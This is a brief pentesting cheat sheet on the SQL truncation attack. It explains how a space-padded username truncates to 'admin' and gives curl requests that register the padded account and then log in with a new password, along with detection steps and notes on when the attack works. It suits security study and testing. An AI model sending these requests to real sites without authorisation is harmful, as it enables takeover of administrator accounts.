# SQL Truncation Attack

When a database column has a maximum length (e.g., VARCHAR(25)), inserting a value longer than the limit causes silent truncation. Registering a username like `admin               x` (admin + spaces + extra char) truncates to `admin` and creates a second "admin" account, allowing password reset/overwrite of the original admin.

## Exploit Steps

```bash
# 1. Register a new account with padded username matching existing admin
#    Username field: "admin               x"  (admin + spaces to fill column + any extra char)
#    Password: anything you choose

# Example via curl POST to registration endpoint
curl -X POST http://<TARGET>/register \
  -d "username=admin               x&password=newpass&confirm=newpass"

# 2. Login with the truncated username and your new password
curl -X POST http://<TARGET>/login \
  -d "username=admin&password=newpass"
```

## Detection / Validation

```bash
# Check column length in source or error messages
# Try usernames of exactly max_length, max_length+1

# After registration, attempt login as admin with your password
# Success = truncation occurred, overwrote or duplicated admin record
```

## Notes
- Works when: no uniqueness check before insert OR uniqueness check uses raw input but store uses truncated value
- Common in MySQL with strict mode OFF (default pre-5.7)
- VARCHAR(n) truncates silently; CHAR(n) pads with spaces
- Whitespace between real username and padding avoids visual detection
- Also applies to email fields: `admin@site.com                    x` → `admin@site.com`
